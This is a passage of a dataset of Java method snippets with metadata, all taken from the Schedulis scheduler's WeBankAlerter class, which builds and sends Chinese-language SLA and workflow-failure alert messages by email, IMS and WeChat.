stringBuffer.append(flow.getFlowId());    stringBuffer.append(\"; </br>\u6267\u884c\u5931\u8d25\u7684\u4efb\u52a1: \");    stringBuffer.append(failedNodeNestId.toString());    stringBuffer.append(\";  </br>\u6267\u884cID: \");    stringBuffer.append(flow.getExecutionId());    stringBuffer.append(\";  </br>\u63d0\u4ea4\u4eba: \") ;    stringBuffer.append(flow.getSubmitUser());    stringBuffer.append(\";  </br>\u63d0\u4ea4\u65f6\u95f4: \") ;    stringBuffer.append(fmt.print(new DateTime(flow.getSubmitTime())));    stringBuffer.append(\";  </br>\u4ee3\u7406\u7528\u6237: \") ;    stringBuffer.append(flow.getProxyUsers());    stringBuffer.append(\";  </br>\u5f00\u59cb\u6267\u884c\u65f6\u95f4: \");    String endTime = fmt.print(new DateTime(flow.getStartTime()));    if(flow.getStatus() == Status.FAILED_FINISHING){      endTime = \"\u5de5\u4f5c\u6d41\u6b63\u5728\u8fd0\u884c\u4e2d\uff0c\u8fd8\u672a\u7ed3\u675f.\";    }    stringBuffer.append(endTime);    stringBuffer.append(\";  </br>\u7ed3\u675f\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(fmt.print(new DateTime(flow.getEndTime())));    stringBuffer.append(\";  </br>\u8017\u65f6: \");    stringBuffer.append(Utils.formatDuration(flow.getStartTime(), flow.getEndTime()));    stringBuffer.append(\";  </br>\u72b6\u6001: \");    stringBuffer.append(flow.getStatus());    if(flow.getExecutionOptions().getDisabledJobs().size()>0) {      stringBuffer.append(\"</br>disabled job(\");      List<Object> disableJobs = flow.getExecutionOptions().getDisabledJobs();      for (Object djob : disableJobs) {        stringBuffer.append(\"; </br>\" + djob + \"\u3001\");      }      stringBuffer.append(\"</br>)\");    }    return stringBuffer.toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "doSlaAlerter", "params": ["SlaOption", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void doSlaAlerter(SlaOption slaOption, String slaMessage){    //\u53d1\u9001\u6d88\u606f\u6e20\u9053    //1 RTX\u6e20\u9053//    this.setAlerterWay(\"1\");//    //\u7ec4\u88c5RTX\u683c\u5f0f\u4fe1\u606f//    String slaMessageRTX = replaceSlaMessageRTX(slaMessage);////    handleSlaAlerter(slaOption, slaMessageRTX);    //2 \u90ae\u7bb1\u6e20\u9053    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if(imsAlerterWays.contains(\"2\")) {      this.setAlerterWay(\"2\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageEmail = replaceSlaMessageEmail(slaMessage);//      handleSlaAlerter(slaOption, slaMessageEmail);    }    if(imsAlerterWays.contains(\"3\")) {      //3 \u5fae\u4fe1\u6e20\u9053      this.setAlerterWay(\"3\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageWeChat = replaceSlaMessageRTX(slaMessage);//      handleSlaAlerter(slaOption, slaMessageWeChat);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "setAlerterWay", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAlerterWay(String alerterWay) {    this.alerterWay = alerterWay;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "handleFlowPausedAlerter", "params": ["ExecutableFlow", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleFlowPausedAlerter(ExecutableFlow flow, String slaMessage, String newTitle){    ExecutionOptions executionOptions = flow.getExecutionOptions();    List<String> emailList = executionOptions.getFailureEmails();    final List<String> rtxListAlerter = new ArrayList<>() ;    for(String str:emailList){      logger.info(\"doSlaAlerter is -->\"+str.split(\"@\")[0]);      rtxListAlerter.add(str.split(\"@\")[0]);    }    //to ims    IMSAlert imsAlert = new IMSAlert(this.alarmServer,this.alarmPort, Integer.parseInt(this.alarmSubSystemID), newTitle,logger);    logger.info(\"--> 2. doSlaAlerter new IMSAlerter instance is success : \" + imsAlert);    //\u544a\u8b66\u4fe1\u606f    imsAlert.setAlertInfo(slaMessage);    //\u544a\u8b66\u65b9\u5f0f    String[] strArr  = this.alerterWay.split(\",\");    for(int i=0 ; i < strArr.length ; i++){      if(strArr[i].matches(\"\\\\d\")){        imsAlert.addAlertWay(Integer.parseInt(strArr[i]));        logger.info(\"--> alerterWay is \"+strArr[i]);      }    }    logger.info(\"--> 3.process alerterWay is successed\");    String failureAlertLevel;    //\u5386\u53f2\u7248\u672c\u517c\u5bb9    if(null == flow.getOtherOption().get(\"failureAlertLevel\") || \"\".equals(flow.getOtherOption().get(\"failureAlertLevel\"))){      failureAlertLevel = \"MAJOR\";    } else {      failureAlertLevel = flow.getOtherOption().get(\"failureAlertLevel\") + \"\";    }    //\u544a\u8b66\u7ea7\u522b    imsAlert.setAlertLevel(AlertLevel.valueOf(failureAlertLevel));    //toEcc    imsAlert.setToECC(Integer.valueOf(this.toEcc));    logger.info(\"--> 4.process alerterReciver is successed\");    imsAlert.setAlertReceivers(rtxListAlerter);    IMSAlert.Result rs = null ;    try {      rs = imsAlert.alert();      logger.info(\"--> 5. imsAlert.alert() is successed. all step is successed !\" );    } catch (IOException e) {      logger.error(\"\u8c03IMS\u63a5\u53e3\u51fa\u9519\uff1a\",e);    }    logger.info(\"\u8c03IMS\u63a5\u53e3\u8fd4\u56de\u7ed3\u679c\uff1a\" + rs.toString());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "handleSlaAlerter", "params": ["SlaOption", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleSlaAlerter(SlaOption slaOption,String slaMessage, String newTitle){    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    final List<String> rtxListAlerter = new ArrayList<>() ;    for(String str:emailList){      logger.info(\"doSlaAlerter is -->\"+str.split(\"@\")[0]);      rtxListAlerter.add(str.split(\"@\")[0]);    }    //to ims    IMSAlert imsAlert = new IMSAlert(this.alarmServer,this.alarmPort, Integer.parseInt(this.alarmSubSystemID), newTitle,logger);    logger.info(\"--> 2. doSlaAlerter new IMSAlerter instance is success : \" + imsAlert);    //\u544a\u8b66\u4fe1\u606f    imsAlert.setAlertInfo(slaMessage);    //\u544a\u8b66\u65b9\u5f0f    String[] strArr  = this.alerterWay.split(\",\");    for(int i=0 ; i < strArr.length ; i++){      if(strArr[i].matches(\"\\\\d\")){        imsAlert.addAlertWay(Integer.parseInt(strArr[i]));        logger.info(\"--> alerterWay is \"+strArr[i]);      }    }    logger.info(\"--> 3.process alerterWay is successed\");    //\u544a\u8b66\u7ea7\u522b    //imsAlert.setAlertLevel(AlertLevel.WARNING);    try {      if(null == slaOption.getLevel() || \"\".equals(slaOption.getLevel())){        imsAlert.setAlertLevel(AlertLevel.MAJOR);      }else{        imsAlert.setAlertLevel(AlertLevel.valueOf(slaOption.getLevel()));      }    } catch (Exception e) {      logger.info(\"\u544a\u8b66\u7ea7\u522b\u83b7\u53d6\u5f02\u5e38\uff0c\u9ed8\u8ba4\u4f7f\u7528MAJOR\u7ea7\u522b\u544a\u8b66\uff01\");      imsAlert.setAlertLevel(AlertLevel.MAJOR);    }    //toEcc    imsAlert.setToECC(Integer.valueOf(this.toEcc));    logger.info(\"--> 4.process alerterReciver is successed\");    imsAlert.setAlertReceivers(rtxListAlerter);    IMSAlert.Result rs = null ;    try {      rs = imsAlert.alert();      logger.info(\"--> 5. imsAlert.alert() is successed. all step is successed !\" );    } catch (IOException e) {      logger.error(\"\u8c03IMS\u63a5\u53e3\u51fa\u9519\uff1a\",e);    }    logger.info(\"\u8c03IMS\u63a5\u53e3\u8fd4\u56de\u7ed3\u679c\uff1a\" + rs.toString());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "replaceSlaMessageRTX", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String replaceSlaMessageRTX(String slaMessage){    String rtx = slaMessage.replaceAll(\"#br\",\"\\n\");    return rtx;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "replaceSlaMessageEmail", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String replaceSlaMessageEmail(String slaMessage){    String email = slaMessage.replaceAll(\"#br\",\"</br>\");    return email;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "createRTXFinishSlaMessage", "params": ["SlaOption", "ExecutableFlow"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String createRTXFinishSlaMessage(final SlaOption slaOption, final ExecutableFlow flow) {    final String type = slaOption.getType();    if (type.equals(SlaOption.TYPE_FLOW_SUCCESS_EMAILS)) {//Flow \u6267\u884c\u6210\u529f \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Flow\",\"SUCCESS\");    } else if (type.equals(SlaOption.TYPE_FLOW_FAILURE_EMAILS)) {//Flow \u6267\u884c\u5931\u8d25 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Flow\",\"FAILURE\");    }  else if (type.equals(SlaOption.TYPE_FLOW_FINISH_EMAILS)) {//Flow \u6267\u884c\u5b8c\u6210 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Flow\",\"FINISH\");    } else if (type.equals(SlaOption.TYPE_JOB_SUCCESS_EMAILS)) {//Job \u6267\u884c\u6210\u529f \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Job\",\"SUCCESS\");    } else if (type.equals(SlaOption.TYPE_JOB_FAILURE_EMAILS)) {//Job \u6267\u884c\u5931\u8d25 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Job\",\"FAILURE\");    }  else if (type.equals(SlaOption.TYPE_JOB_FINISH_EMAILS)) {//Job \u6267\u884c\u5b8c\u6210 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Job\",\"FINISH\");    } else {      return \"Unrecognized SLA type \" + type;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "buildRTXFinishSlaMessageText", "params": ["ExecutableFlow", "SlaOption", "String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String buildRTXFinishSlaMessageText(ExecutableFlow flow, SlaOption slaOption, String taskType, String runStatus){    final int execId = flow.getExecutionId();    String slaText = \"Finish Sla Message Bulid\";    runStatus = \"Finish\".equals(runStatus) ? \"Finish\":runStatus;    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    if(\"Flow\".equals(taskType)){      final String flowName = (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicInfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u5de5\u4f5c\u6d41(Flow) \" + flowName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + runStatus + \" ! \\n\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\";      String endTime = fmt.print(new DateTime(flow.getEndTime()));      if(flow.getStatus() == Status.FAILED_FINISHING){        endTime = \"\u5de5\u4f5c\u6d41\u6b63\u5728\u8fd0\u884c\u4e2d\uff0c\u8fd8\u672a\u7ed3\u675f\";      }      List<ExecutableNode> executableNodes = new ArrayList<>();      FlowUtils.getAllFailedNodeList(flow, executableNodes);      List<String> failedNodeNestId = FlowUtils.getAllFailedNodeNestIdSortByEndTime(executableNodes);      failedNodeNestId = FlowUtils.getThreeFailedNodeNestId(failedNodeNestId);      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: \\n\"              + \"\u5de5\u4f5c\u6d41: \" + flowName + \"\\n\"              + \"\u6267\u884c\u5931\u8d25\u7684\u4efb\u52a1: \" + failedNodeNestId.toString() + \"\\n\"              + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flowStartTimeChecker(flow))) + \".\\n\"              + \"\u5de5\u4f5c\u6d41\u7ed3\u675f\u65f6\u95f4: \" + endTime + \".\\n\"              + \"\u5de5\u4f5c\u6d41\u6267\u884c\u8017\u65f6: \" + Utils.formatDuration(flow.getStartTime(), flow.getEndTime()) + \".\\n\";      slaText = basicInfo + expected;    } else {      final String jobName = (String) slaOption.getInfo().get(SlaOption.INFO_JOB_NAME);      ExecutableNode job = flow.getExecutableNode(jobName);      if(job == null){        job = flow.getExecutableNodePath(jobName);      }      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicInfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u4efb\u52a1(Job) \" + jobName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + runStatus + \"! \\n\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: \\n\"              + \"\u4efb\u52a1\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"\\n\"              + \"\u4efb\u52a1\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(job.getStartTime())) + \".\\n\"              + \"\u4efb\u52a1\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(job.getEndTime())) + \".\\n\"              + \"\u4efb\u52a1\u6267\u884c\u8017\u65f6: \" + Utils.formatDuration(job.getStartTime(), job.getEndTime()) + \".\\n\"              + \"\u4efb\u52a1\u5c5e\u4e8e\u5de5\u4f5c\u6d41: \" + flow.getId() + \".\\n\";      slaText = basicInfo + expected;    }    return slaText;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "createEmailFinishSlaMessage", "params": ["SlaOption", "ExecutableFlow"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String createEmailFinishSlaMessage(final SlaOption slaOption, final ExecutableFlow flow) {    final String type = slaOption.getType();    if (type.equals(SlaOption.TYPE_FLOW_SUCCESS_EMAILS)) {//Flow \u6267\u884c\u6210\u529f \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Flow\",\"SUCCESS\");    } else if (type.equals(SlaOption.TYPE_FLOW_FAILURE_EMAILS)) {//Flow \u6267\u884c\u5931\u8d25 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Flow\",\"FAILURE\");    }  else if (type.equals(SlaOption.TYPE_FLOW_FINISH_EMAILS)) {//Flow \u6267\u884c\u5b8c\u6210 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Flow\",\"FINISH\");    } else if (type.equals(SlaOption.TYPE_JOB_SUCCESS_EMAILS)) {//Job \u6267\u884c\u6210\u529f \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Job\",\"SUCCESS\");    } else if (type.equals(SlaOption.TYPE_JOB_FAILURE_EMAILS)) {//Job \u6267\u884c\u5931\u8d25 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Job\",\"FAILURE\");    }  else if (type.equals(SlaOption.TYPE_JOB_FINISH_EMAILS)) {//Job \u6267\u884c\u5b8c\u6210 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Job\",\"FINISH\");    } else {      return \"Unrecognized SLA type \" + type;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "buildFlowPausedMessage", "params": ["ExecutableFlow", "String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String buildFlowPausedMessage(ExecutableFlow flow, String nodePath, String split){    final int execId = flow.getExecutionId();    String slaText = \"Finish Sla Message Bulid\";    ExecutionOptions executionOptions = flow.getExecutionOptions();    List<String> emailList = executionOptions.getFailureEmails();    //\u5386\u53f2\u7248\u672c\u517c\u5bb9    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    final String flowName = flow.getId();    final String basicInfo =            \"\u544a\u8b66: \u4f60\u7684\u5de5\u4f5c\u6d41(Flow) \" + flowName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + flow.getStatus() + \" ! \" + split                    + \"\u8bf7\u7acb\u5373\u8054\u7cfb \" + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + split;    final String expected =            \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: \" + split                    + \"\u5de5\u4f5c\u6d41: \" + flowName + split                    + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + split                    + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + split                    + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flowStartTimeChecker(flow))) + \".\" + split                    + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u6682\u505c\u65f6\u95f4: \" + fmt.print(flow.getUpdateTime()) + \".\" + split                    + \"\u5907\u6ce8: job(\" + nodePath + \")\u8fd0\u884c\u5931\u8d25\u5de5\u4f5c\u6d41\u5df2\u6682\u505c\u8fd0\u884c.\" + split;    slaText = basicInfo + expected;    return slaText;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "buildFlowPausedMessage", "params": ["SlaOption", "ExecutableFlow", "String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String buildFlowPausedMessage(SlaOption slaOption, ExecutableFlow flow, String nodePath, String split){    final int execId = flow.getExecutionId();    String slaText = \"Finish Sla Message Bulid\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    final String flowName = (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f    String informInfo;    String basicInfo;    if (\"true\".equals(depTypeInform)) {      informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";    }else {      informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";    }    basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u5de5\u4f5c\u6d41(Flow) \" + flowName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + flow.getStatus() + \" ! \" + split + informInfo        + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\"  + split;    final String expected =            \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: \" + split                    + \"\u5de5\u4f5c\u6d41: \" + flowName + split                    + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + split                    + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + split                    + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flowStartTimeChecker(flow))) + \".\" + split                    + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u6682\u505c\u65f6\u95f4: \" + fmt.print(flow.getUpdateTime()) + \".\" + split                    + \"\u5907\u6ce8: job(\" + nodePath + \")\u5df2\u7ecf\u6267\u884c\u5931\u8d25\uff0c\u7b49\u5f85\u4eba\u5de5\u5904\u7406.\" + split;    slaText = basicInfo + expected;    return slaText;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "buildEmailFinishSlaMessageText", "params": ["ExecutableFlow", "SlaOption", "String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String buildEmailFinishSlaMessageText(ExecutableFlow flow, SlaOption slaOption, String taskType, String runStatus){    final int execId = flow.getExecutionId();    String slaText = \"Finish Sla Message Bulid\";    runStatus = \"Finish\".equals(runStatus) ? \"Finish\":runStatus;    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    if(\"Flow\".equals(taskType)){      final String flowName = (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicInfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u5de5\u4f5c\u6d41(Flow) \" + flowName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + runStatus + \" ! </br>\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\";      String endTime = fmt.print(new DateTime(flow.getEndTime()));      if(flow.getStatus() == Status.FAILED_FINISHING){        endTime = \"\u5de5\u4f5c\u6d41\u6b63\u5728\u8fd0\u884c\u4e2d\uff0c\u8fd8\u672a\u7ed3\u675f\";      }      List<ExecutableNode> executableNodes = new ArrayList<>();      FlowUtils.getAllFailedNodeList(flow, executableNodes);      List<String> failedNodeNestId = FlowUtils.getAllFailedNodeNestIdSortByEndTime(executableNodes);      failedNodeNestId = FlowUtils.getThreeFailedNodeNestId(failedNodeNestId);      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: </br>\"              + \"\u5de5\u4f5c\u6d41: \" + flowName + \"</br>\"              + \"\u6267\u884c\u5931\u8d25\u7684\u4efb\u52a1: \" + failedNodeNestId.toString() + \"</br>\"              + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flowStartTimeChecker(flow))) + \".</br>\"              + \"\u5de5\u4f5c\u6d41\u7ed3\u675f\u65f6\u95f4: \" + endTime + \".</br>\"              + \"\u5de5\u4f5c\u6d41\u6267\u884c\u8017\u65f6: \" + Utils.formatDuration(flow.getStartTime(), flow.getEndTime()) + \".</br>\";      slaText = basicInfo + expected;    } else {      final String jobName =          (String) slaOption.getInfo().get(SlaOption.INFO_JOB_NAME);      ExecutableNode job = flow.getExecutableNode(jobName);      if(job == null){        job = flow.getExecutableNodePath(jobName);      }      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicInfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u4efb\u52a1(Job) \" + jobName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + runStatus + \"! </br>\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: </br>\"              + \"\u4efb\u52a1\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"</br>\"              + \"\u4efb\u52a1\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(job.getStartTime())) + \".</br>\"              + \"\u4efb\u52a1\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(job.getEndTime())) + \".</br>\"              + \"\u4efb\u52a1\u6267\u884c\u8017\u65f6: \" + Utils.formatDuration(job.getStartTime(), job.getEndTime()) + \".</br>\"              + \"\u4efb\u52a1\u5c5e\u4e8e\u5de5\u4f5c\u6d41: \" + flow.getId() + \".</br>\";      slaText = basicInfo + expected;    }    return slaText;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "createRTXSlaMessage", "params": ["SlaOption", "ExecutableFlow"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String createRTXSlaMessage(final SlaOption slaOption, final ExecutableFlow flow) {    final String type = slaOption.getType();    if (type.equals(SlaOption.TYPE_FLOW_FINISH)) {      return 